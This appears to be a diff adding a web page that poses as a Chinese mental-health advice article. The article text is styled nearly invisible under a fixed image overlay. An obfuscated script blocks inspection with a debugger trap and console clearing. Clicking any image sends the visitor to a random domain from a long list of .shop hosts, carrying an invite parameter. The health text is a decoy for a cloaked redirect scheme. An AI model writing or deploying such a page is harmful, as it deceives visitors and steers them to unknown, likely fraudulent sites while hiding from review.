@@ -1,0 +1,111 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>保持心理健康的10种方法</title>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #f7f8fc 0%, #eef2ff 100%);
+            font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
+        }
+        .article {
+            padding: 20px;
+            color:#f4f5ff;
+        }
+        .article h1 {font-size: 20px;text-align: center;line-height: 40px;}
+        .article p {font-size: 14px;line-height: 24px;text-indent: 2em;}
+        .card {
+            background: #ffffff;
+            width: 90%;
+            max-width: 480px;
+            padding: 48px 32px;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+        /* Loading旋转动画 */
+        .loader {
+            width: 56px;
+            height: 56px;
+            border: 4px solid #e6edff;
+            border-top-color: #3671e9;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 24px;
+        }
+        @keyframes spin {
+            to {transform: rotate(360deg);}
+        }
+        h2 {
+            font-size: 24px;
+            color: #1d2939;
+            margin-bottom: 12px;
+        }
+        .desc {
+            font-size: 15px;
+            color: #667085;
+            margin-bottom: 28px;
+            line-height: 1.6;
+        }
+        .error-text {
+            font-size: 18px;
+            color: #d92d20;
+            margin-bottom: 20px;
+        }
+        .btn-link {
+            display: inline-block;
+            padding: 14px 36px;
+            background-color: #3671e9;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.25s ease;
+        }
+        .btn-link:hover {
+            background-color: #2859c4;
+        }
+        .tip-small {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #98a2b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="article">
+        <h1>保持心理健康的10种方法</h1>
+        <p>保持心理健康主要有规律作息、均衡饮食、适度运动、培养兴趣、社交互动、情绪管理、压力调节、专业支持、正念练习和自我关怀等方法。</p>
+        <p>一、规律作息</p>
+        <p>保持固定作息时间有助于稳定生物钟，每日保证七到九小时睡眠能改善情绪调节能力。避免熬夜和昼夜颠倒可减少焦虑抑郁风险，睡前远离电子设备能提升睡眠质量。建立睡前放松程序如阅读或温水浴，有助于身心进入休息状态。</p>
+        <p>二、均衡饮食</p>
+        <p>摄入富含Omega-3脂肪酸的深海鱼类和坚果能促进大脑健康，多种颜色的蔬菜水果提供抗氧化物质。全谷物和优质蛋白如豆制品有助于维持血糖稳定，适量补充维生素B族可支持神经系统功能。避免高糖高脂食物对情绪波动的影响。</p>
+        <p>三、适度运动</p>
+        <p>每周进行三到五次有氧运动如快走或游泳，能刺激内啡肽分泌改善情绪。结合力量训练可增强自我效能感，团体运动项目还能提供社交机会。运动强度以微微出汗为宜，持续三十分钟以上效果显著。</p>
+        <p>四、培养兴趣</p>
+        <p>从事创造性活动如绘画或音乐制作能产生心流体验，学习新技能如语言或手工艺可增强认知储备。定期参与文化活动和户外探索，有助于建立生活多样性和意义感。</p>
+        <p>五、自我关怀</p>
+        <p>定期进行自我compassion练习，用对待好友的方式对待自己。设置专属的放松时间和空间，避免过度自我批评和完美主义倾向。</p>
+        <p>保持心理健康需要建立持续的生活习惯，将上述方法融入日常生活节奏中。注意观察自身情绪变化规律，在季节转换或生活变动时期加强自我照顾。建立个人化的心理健康工具箱，包含快速缓解压力和长期维持健康的方法。定期评估心理状态并调整策略，在需要时勇敢寻求专业帮助。培养积极的生活态度和弹性思维，认识到心理健康是动态过程而非静止状态。通过多元化方式滋养心灵，才能构建稳固的心理防线应对生活挑战。</p>
+        <div style="position:fixed;left:50%;top:50%;transform: translate(-50%, -50%);font-size:16px;background:rgba(255, 255, 255, 0.9);color:#fff;display:block;width:300px;height:200px;text-align:center;line-height:50px;text-decoration:none;border-radius:5px;display:flex;align-items: center;justify-content: center;" id="imageBox"><img src="./img1.jpg" style="width:180px;" onclick="get_more()"><img src="./img2.jpg" style="width:180px;" onclick="get_more()"><img src="./img3.jpg" style="width:180px;" onclick="get_more()"><img src="./img4.jpg" style="width:180px;" onclick="get_more()"><img src="./img5.jpg" style="width:180px;" onclick="get_more()"></div>
+    </div>
+
+<script>
+    var _0xod2='jsjiami.com.v7';const _0x37e1c2=_0x334c;(function(_0x535a30,_0x1028d2,_0x4fb659,_0x1996d4,_0x37aa72,_0x4ed220,_0x5e4bf4){return _0x535a30=_0x535a30>>0x8,_0x4ed220='hs',_0x5e4bf4='hs',function(_0x1f2692,_0x3877d4,_0x5ccecf,_0x3b426c,_0x1ef9e9){const _0x5886d4=_0x334c;_0x3b426c='tfi',_0x4ed220=_0x3b426c+_0x4ed220,_0x1ef9e9='up',_0x5e4bf4+=_0x1ef9e9,_0x4ed220=_0x5ccecf(_0x4ed220),_0x5e4bf4=_0x5ccecf(_0x5e4bf4),_0x5ccecf=0x0;const _0x13fbbd=_0x1f2692();while(!![]&&--_0x1996d4+_0x3877d4){try{_0x3b426c=parseInt(_0x5886d4(0xa6,'4cD8'))/0x1*(parseInt(_0x5886d4(0x99,'p#K9'))/0x2)+parseInt(_0x5886d4(0xba,'olYf'))/0x3+parseInt(_0x5886d4(0x78,'Jtve'))/0x4*(-parseInt(_0x5886d4(0x9f,'N*DA'))/0x5)+-parseInt(_0x5886d4(0xb6,'kj#O'))/0x6+-parseInt(_0x5886d4(0xd0,'kI4T'))/0x7*(parseInt(_0x5886d4(0x79,'mtX5'))/0x8)+parseInt(_0x5886d4(0x9b,'Jtve'))/0x9+-parseInt(_0x5886d4(0x77,'dMDz'))/0xa;}catch(_0x5d2979){_0x3b426c=_0x5ccecf;}finally{_0x1ef9e9=_0x13fbbd[_0x4ed220]();if(_0x535a30<=_0x1996d4)_0x5ccecf?_0x37aa72?_0x3b426c=_0x1ef9e9:_0x37aa72=_0x1ef9e9:_0x5ccecf=_0x1ef9e9;else{if(_0x5ccecf==_0x37aa72['replace'](/[HJXlqYhxKnFWEMCGpkybf=]/g,'')){if(_0x3b426c===_0x3877d4){_0x13fbbd['un'+_0x4ed220](_0x1ef9e9);break;}_0x13fbbd[_0x5e4bf4](_0x1ef9e9);}}}}}(_0x4fb659,_0x1028d2,function(_0x54d082,_0x263717,_0x236e73,_0x44da6a,_0x175bac,_0x2e4551,_0x1971de){return _0x263717='\x73\x70\x6c\x69\x74',_0x54d082=arguments[0x0],_0x54d082=_0x54d082[_0x263717](''),_0x236e73='\x72\x65\x76\x65\x72\x73\x65',_0x54d082=_0x54d082[_0x236e73]('\x76'),_0x44da6a='\x6a\x6f\x69\x6e',(0x8b2b01,_0x54d082[_0x44da6a](''));});}(0xbc00,0xb60d1,_0x9af5,0xbe),_0x9af5)&&(_0xod2=0x1c4);const devtoolsDetector=/./;devtoolsDetector[_0x37e1c2(0xb2,'p#K9')]=![];function _0x9af5(){const _0x3f82f1=(function(){return[_0xod2,'yhGjHbsqljWFiXaxmEMiX.fclFoJkm.vnXl7KYpC==','Amkqw8oSda','W4HuW7OVz8kexZdcSCo9WRXtwJjEWQhcLXlcRGWYW4tcOsZdOb5RW6GyWRVdSSktWOC','m8oXW5xcMmkmWOFcSZ97W4GYfIOsW4LHW6hdUqy3DwNdLSopmvpcTNLeW4ZdO8kcaW','WQXsWRFcG3CWW5NcP23cNLb8','W5lcHdBcS8kyWQxdIeVcJLGFW7BdUmo/fchdQCogW4hcGSk9DhvMha','fuhcS0un','CICZlhbRy3FcJmkyW6ldSfuCWRJcIL/dM8khWQNcO8oHWQ43eW','hSkDeaddTH9wcq','W7hdU8kdgc4','WONdUSklWOvCBCkTW4hcMCojmGS','r8oFcrldJe0uANlcGmoklCkQFmoxsmopx0KZabi4jdG','WQxcMvu6eW','grGBW54','vgm5WP7cHCkMrr7dR8kwWOdcRtNdTCktW6mhbq7dGeVcGCohW5/dRa','W4pcUSkGWQVdJW','lhNcKLaeChtcTSoMWQ3cP3HAoI5KW7xdVCk5fvtdKquzcG','z24Dza8Rg8omWQFdRaXNW4LlWP5TWRZcN8kRhSk/g8oclCkG','sZrVimkRp3qVW5uWc8oBnqFcLLxdUxhdVmk3jeRcKYSo','W7VcNCkCrSolWQDrWOK','W7KTW4ldMLn5','i8opW6/cImk7','s3anvGO','eZSpW4aM','W708W5JdJvqRwMz5W7BdK8o5kGxcPI9hvSk0nmkZbCkrb8oIW5W','f8ojdSkevqJcGLSylY/dHaO','DmkqWRpdLmo9f8koW4tdVfSYW4W','hmoZjCovyr7dLtG','W5VcLCkPWP7dTHy','W44jW5LDDYK8WQK5WPHYW77cOCkTW416WOldH8opiCoEwCoAWO84','kcX8aSoThLRdN8kYW5lcRSkaWRDnqfzfW4vtW5uOzSkjaMu','rCkXpmohw0ZcL1VcTCkUWOD+kGP+dCo/WP9CnvrFWOVdHua','W7elW7tdUZy','DJ/dLM86ishdMSoc','q8ooeWxdIX8'].concat((function(){return['W5Wxh3H/','W7RcHmkjuCoDW58rW57cSYDIWPZcQmkFWPldImorW41+ycXZemoAWOG','W7WwW7BdGZW+WQxdGfBcHvCyW64ZaCoEWQijzML5vJtcVY8','W7NcVCoZW6ut','C3BcUYWMWOHbmG','kcX8aSoThLRdN8kYW5lcRSkgWRDnqfzfW4vtW5uOzSkjaMu','gSoHs8oYACk4bYJcO8kmW45MW5JdRaRcMCoEWQJdJ3VdG1RdVsewlrWFta','r8oFcrldJe0uANlcGmoklSkVFmoxsmopx0KZabi4jdG','quj7i8kEWOW','gIDcWOm/W5tdPw3dRCoTtWVcV2lcVCoEnJ3dPmksW5urW4JcGCo0','gSoHs8oYACk4bYJdOSkvW4K+WPhdUrNcJSkhW7ZcGg/cLeRdRd4f','WQ3cMLqW','uhGUWO/cGSo1bv8','dH/dMghcGW','vgm5WP7cHCkMrr7cR8kAW5/cRNRdRmktWRGnbvtcNLpdNmovW5JdTt50uSoBmCoXW7ZdQa','r8ozgaq','WQyLWPXAWOu','WPT1W499WOfip8oNWQGFW6RcPbqoWO/dGCo5rZJdK1mXWR7dQduHWOWQo8k4CSkUua','qfH5oSkzW5mXWPxdImoaW7JcS1/cMtOOWQ/cLdPQxv3dOCoMW7C','WR0LWPfgWPpcTM7cVCkUrGrpW7xdSMbbWQrxFMRdMWRcOghdQdNdPmomAmo3xSkZWPa','rx/dPuBdLKtdLI03kSkIdmkuW74Gw34gBtuPWOiVyG0','ymken8oyWRBcTdmt','WQVcGu4LeSo+dYDXWP7dUmkxWPvhWPRdHXPwW5ZcSCoZW5efW5S+','WR3dP8oIWOibW4BdUSkS','x8o0bCkDlficW4fKW4SghW','vtOmmNS','DmksWRtdKCo6h8o1WOldSemlW59iWPa','WP7dHmo3W4pcReOGkCoeW5/dIWDk','lhNcKLaeChtcTSoMWQ3cP3HEoI5KW7xdVCk5fvtdKquzcG','sZrVimkRp3qVWPu0vmoCAexcI1ddUMldSSkOFHFcGsWxtbK1W59NgHKt','WQzqWRldVajVW7dcRhi','jdf7aSoYrqW','EwSVzYy','gmkEW5JcGZ0lW4tdMCoWW6dcNdddR1BdICk6nc4tnSo9l3u1EG','Ex9AwZjDhJOoW6SkkqOaW4RcTxzQW6mQsSkyWPldU8kw','xmoFba7dMG'].concat((function(){return['W708W5JdJvqRwMz5W7BdK8o7lGxcSYvht8k5p8oZwmkkamo9','WQ3cKa9vumk8WRhdQa','Ex9AwZjDhJOoW6SkkaeaW4RcTxzQW6mQsSkyWPldU8kw','nZvKfCkdW5uOWPNcPCkdW5JcHSoEtSkDlSkzWQHEWRBdIadcIL4E','W6yqjvjedCovWOS','eH/dUgFcTa','ucv6iSk7Bq','Fw5atdup','q8krv8orbeVdL1G','W7pdImkmrmo+qIZdUSolW5NcN8kEumk5u8kaANFdGIavldtdQqy','W4JcKsZcP8keW7i','rHxdQLJdR0LdWQpcK8k5W6X7W4xdVtbTigxcNdJdMIxdMqVcHW','t8kjw8otbv0','aCkYvSoaEaa','rCkXpmohw0ZcL1VcTCkUWOD8nuHHgmoVWOLwmvrFWOVdHua','W4HuW7OVz8kexZdcSmoJWReotNTrW7RdJHxcSriZWONcOJtdQKPGW65B','W7ldL8kWkI/cVCkWbez/WQZcJcfRW6/dJ2a1W4/cMCkUFJRcRSoh','WRToFGiaxCkoWOfhcYBcHfW','WRdcGum5ba','kcX8aSoThLRdN8kYW5lcRSkhWQ8px0nvW5nzW5eOzSkjaMu','kcX8aSoThLRdN8kYW5lcRSkhWQSpx0nvW5nzW5eOzSkjaMu','dYb9W5RdGCkTuL3dSCktWR/dLuC','WOqtWOzZWRi','qCoecG','fSonW6xcRCk5','ms5N','cMxcReSc','D23cRd0HW5SbC8o5DSkanX50iKH7wmo0WOJcGav1WQVcGG','W7WwW7BdGZW+WQxdGfBcHvCBW6SZaCoEWQijzML5vJtcVY8','haFdO3JcTCo3W5rxWQpcLhVdLtBcLSk+W7SLumkDW6SQW4NdOSkqW6u','g8o7sCoRBSoN','m8oXW5xcMmkmWOFcSZ87W4u7t2fAW55QWQJcU1W+pZtdHmoika','W7iTW5G','BH95eqRdGCoMoCofpSoeEqlcUmkoudzitYDDW5/dV8ovW4S'];}()));}()));}());_0x9af5=function(){return _0x3f82f1;};return _0x9af5();};const checkDevtools=()=>{const _0x19745e=_0x37e1c2,_0x33a342={'vZtHM':_0x19745e(0x8c,'L5#@'),'HwMPw':_0x19745e(0xc3,'rWvn'),'MHDEF':function(_0x2938da,_0x329cc5){return _0x2938da+_0x329cc5;},'HieQl':function(_0x31cdfa,_0x3eb7ca){return _0x31cdfa*_0x3eb7ca;},'NhJku':_0x19745e(0x98,'cyls'),'DjdBv':function(_0xfc956a,_0x56139f){return _0xfc956a===_0x56139f;},'eivHy':_0x19745e(0xa1,'N5Lj'),'lOqfR':_0x19745e(0x8e,'d[vS'),'QBcER':function(_0x16e1a1,_0x64e750){return _0x16e1a1<_0x64e750;},'OiKnx':function(_0x4cbcd8,_0x19d60d){return _0x4cbcd8-_0x19d60d;},'QLUez':function(_0x54dcbf,_0x4ee002){return _0x54dcbf===_0x4ee002;}};while(!![]){if(_0x33a342[_0x19745e(0xdc,'N5Lj')](_0x33a342[_0x19745e(0x7e,'N*DA')],_0x33a342[_0x19745e(0x75,'yy9T')]))_0xcecb9d[_0x204832][_0x19745e(0xa4,'p0Xr')][_0x19745e(0xa0,'QPY[')]=_0x33a342['vZtHM'];else{const _0x261d70=Date[_0x19745e(0xbc,'p0Xr')]();debugger;const _0x460b0d=Date[_0x19745e(0xbe,'M(8C')]();if(_0x33a342[_0x19745e(0xbb,'LhV[')](_0x33a342[_0x19745e(0x9a,'lu#k')](_0x460b0d,_0x261d70),0x14))break;else{if(_0x33a342[_0x19745e(0xcc,'Hb$0')](_0x19745e(0xd5,'esKe'),_0x19745e(0xcf,'p6ZR'))){const _0x1606ba=new _0x42318f(_0x1ba0a8[_0x19745e(0x85,'m%Bd')][_0x19745e(0xab,'m4(E')]);var _0x35550f=_0x1606ba[_0x19745e(0xc5,'nX2f')](_0x33a342[_0x19745e(0x84,'kI4T')]);_0x2420cc[_0x19745e(0x8d,'olYf')][_0x19745e(0x90,'p0Xr')]=_0x33a342[_0x19745e(0xbd,'B7K7')](_0x3b646c[_0x4c8190[_0x19745e(0xd2,'L5#@')](_0x33a342[_0x19745e(0xc7,'dMDz')](_0x17376a[_0x19745e(0x7a,'esKe')](),_0x4ce9a7[_0x19745e(0x80,'p0Xr')]))]+_0x33a342[_0x19745e(0xbf,'Hb$0')],_0x35550f);}else devtoolsDetector['opened']=!![];}}}};setInterval(()=>{const _0xac5032=_0x37e1c2,_0x1d7d7c={'VhYKO':function(_0x366306){return _0x366306();}};devtoolsDetector[_0xac5032(0xb1,'dMDz')]&&(_0x1d7d7c[_0xac5032(0x81,'kj#O')](checkDevtools),console['clear']());},0x64),checkDevtools();const urls=[_0x37e1c2(0x9e,'m4(E'),'https://3d568738fzajh.zhizhi.shop',_0x37e1c2(0x92,')0[C'),'https://3ajq10qdg2awo.zhizhi.shop',_0x37e1c2(0x94,'LhV['),'https://3s1n153mdlcjn.zhizhi.shop',_0x37e1c2(0xc2,'d[vS'),_0x37e1c2(0xb3,'mtX5'),_0x37e1c2(0x86,'QPY['),_0x37e1c2(0x93,'Arjv'),_0x37e1c2(0x7c,'QPY['),_0x37e1c2(0x8b,'rWvn'),_0x37e1c2(0xa8,'M(8C'),_0x37e1c2(0xcd,'lu#k'),'https://san9.lfyifan.shop',_0x37e1c2(0x76,'nX2f'),_0x37e1c2(0xc9,'B7K7'),_0x37e1c2(0xb4,'1(v5'),_0x37e1c2(0x7d,'mtX5'),_0x37e1c2(0xa3,'zyXG'),_0x37e1c2(0x9d,'Hb$0'),_0x37e1c2(0xd4,'olYf'),_0x37e1c2(0xd1,'p0Xr'),_0x37e1c2(0x83,'N*DA'),_0x37e1c2(0xd6,'Hb$0'),_0x37e1c2(0xae,'S$e%'),_0x37e1c2(0xa2,'DjzK'),'https://san10.ylypkj.shop',_0x37e1c2(0x8f,'olYf'),_0x37e1c2(0xc8,'1(v5'),'https://3psvsakssllzl.zhizhi.shop',_0x37e1c2(0x87,'rWvn'),'https://2xingyun03.zycypc.com','https://san11.ylypkj.shop','https://san12.ylypkj.shop',_0x37e1c2(0xc6,'tRJF'),'https://san14.ylypkj.shop',_0x37e1c2(0xc0,'m%Bd'),_0x37e1c2(0x97,'L5#@'),'https://san17.ylypkj.shop','https://san18.ylypkj.shop',_0x37e1c2(0xa7,'zyXG'),'https://san20.ylypkj.shop',_0x37e1c2(0xc4,'B7K7'),_0x37e1c2(0xb9,'QPY['),'https://san23.ylypkj.shop',_0x37e1c2(0x8a,'H[uy'),_0x37e1c2(0xb5,'p6ZR'),_0x37e1c2(0xb8,'QPY['),_0x37e1c2(0x7b,'69z8'),_0x37e1c2(0xcb,'7((R'),'https://san29.ylypkj.shop',_0x37e1c2(0x88,'p0Xr'),_0x37e1c2(0xd8,'m4(E'),_0x37e1c2(0x82,'Zu^v'),_0x37e1c2(0xc1,'N*DA'),_0x37e1c2(0xa5,'nX2f'),_0x37e1c2(0xd7,'N5Lj'),_0x37e1c2(0xb0,'AV)Q'),'https://san37.ylypkj.shop',_0x37e1c2(0x95,'yioh'),'https://san39.ylypkj.shop','https://san40.ylypkj.shop'];function get_more(){const _0x2f4a08=_0x37e1c2,_0x41a5ab={'OEwLE':_0x2f4a08(0x89,'Arjv'),'mCdyE':function(_0x10e8bb,_0x2f7fa1){return _0x10e8bb+_0x2f7fa1;},'rfYTf':function(_0x5ec18d,_0x5bec56){return _0x5ec18d+_0x5bec56;},'LFGYO':'?invite='},_0x3ba779=new URLSearchParams(window['location']['search']);var _0x4eef7b=_0x3ba779['get'](_0x41a5ab['OEwLE']);window[_0x2f4a08(0xa9,'kj#O')]['href']=_0x41a5ab['mCdyE'](_0x41a5ab['rfYTf'](urls[Math[_0x2f4a08(0xdb,'Jtve')](Math[_0x2f4a08(0xaf,'7((R')]()*urls[_0x2f4a08(0xac,'zyXG')])],_0x41a5ab['LFGYO']),_0x4eef7b);}function _0x334c(_0x36409d,_0x54920b){const _0x9af5d7=_0x9af5();return _0x334c=function(_0x334cfa,_0x1cf3de){_0x334cfa=_0x334cfa-0x75;let _0x4d3e2c=_0x9af5d7[_0x334cfa];if(_0x334c['hzFPEe']===undefined){var _0x2bb59a=function(_0x3f1d94){const _0x305366='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x33a730='',_0x57e884='';for(let _0x2870e6=0x0,_0x3ab7d1,_0x2dd20a,_0x4185a2=0x0;_0x2dd20a=_0x3f1d94['charAt'](_0x4185a2++);~_0x2dd20a&&(_0x3ab7d1=_0x2870e6%0x4?_0x3ab7d1*0x40+_0x2dd20a:_0x2dd20a,_0x2870e6++%0x4)?_0x33a730+=String['fromCharCode'](0xff&_0x3ab7d1>>(-0x2*_0x2870e6&0x6)):0x0){_0x2dd20a=_0x305366['indexOf'](_0x2dd20a);}for(let _0x380690=0x0,_0x141f0c=_0x33a730['length'];_0x380690<_0x141f0c;_0x380690++){_0x57e884+='%'+('00'+_0x33a730['charCodeAt'](_0x380690)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x57e884);};const _0x31c33b=function(_0x472bbb,_0xba0af7){let _0x32e0c2=[],_0x3d2c64=0x0,_0x31a93e,_0x3db099='';_0x472bbb=_0x2bb59a(_0x472bbb);let _0x22e347;for(_0x22e347=0x0;_0x22e347<0x100;_0x22e347++){_0x32e0c2[_0x22e347]=_0x22e347;}for(_0x22e347=0x0;_0x22e347<0x100;_0x22e347++){_0x3d2c64=(_0x3d2c64+_0x32e0c2[_0x22e347]+_0xba0af7['charCodeAt'](_0x22e347%_0xba0af7['length']))%0x100,_0x31a93e=_0x32e0c2[_0x22e347],_0x32e0c2[_0x22e347]=_0x32e0c2[_0x3d2c64],_0x32e0c2[_0x3d2c64]=_0x31a93e;}_0x22e347=0x0,_0x3d2c64=0x0;for(let _0xb4f400=0x0;_0xb4f400<_0x472bbb['length'];_0xb4f400++){_0x22e347=(_0x22e347+0x1)%0x100,_0x3d2c64=(_0x3d2c64+_0x32e0c2[_0x22e347])%0x100,_0x31a93e=_0x32e0c2[_0x22e347],_0x32e0c2[_0x22e347]=_0x32e0c2[_0x3d2c64],_0x32e0c2[_0x3d2c64]=_0x31a93e,_0x3db099+=String['fromCharCode'](_0x472bbb['charCodeAt'](_0xb4f400)^_0x32e0c2[(_0x32e0c2[_0x22e347]+_0x32e0c2[_0x3d2c64])%0x100]);}return _0x3db099;};_0x334c['iRJnjE']=_0x31c33b,_0x36409d=arguments,_0x334c['hzFPEe']=!![];}const _0x221eba=_0x9af5d7[0x0],_0x2625d9=_0x334cfa+_0x221eba,_0x5379b6=_0x36409d[_0x2625d9];return!_0x5379b6?(_0x334c['nnaGPH']===undefined&&(_0x334c['nnaGPH']=!![]),_0x4d3e2c=_0x334c['iRJnjE'](_0x4d3e2c,_0x1cf3de),_0x36409d[_0x2625d9]=_0x4d3e2c):_0x4d3e2c=_0x5379b6,_0x4d3e2c;},_0x334c(_0x36409d,_0x54920b);}const imageBox=document['getElementById'](_0x37e1c2(0xd9,'Zu^v')),wrapperDivs=imageBox[_0x37e1c2(0xad,'dMDz')];for(let i=0x0;i<wrapperDivs[_0x37e1c2(0xda,'nX2f')];i++){wrapperDivs[i][_0x37e1c2(0x91,'LhV[')]['display']='none';}const randomIndex=Math[_0x37e1c2(0xaa,'d[vS')](Math['random']()*wrapperDivs['length']);wrapperDivs[randomIndex][_0x37e1c2(0xb7,'L5#@')]['display']=_0x37e1c2(0xd3,'yy9T');var version_ = 'jsjiami.com.v7';
+</script>
+</body>
+</html>
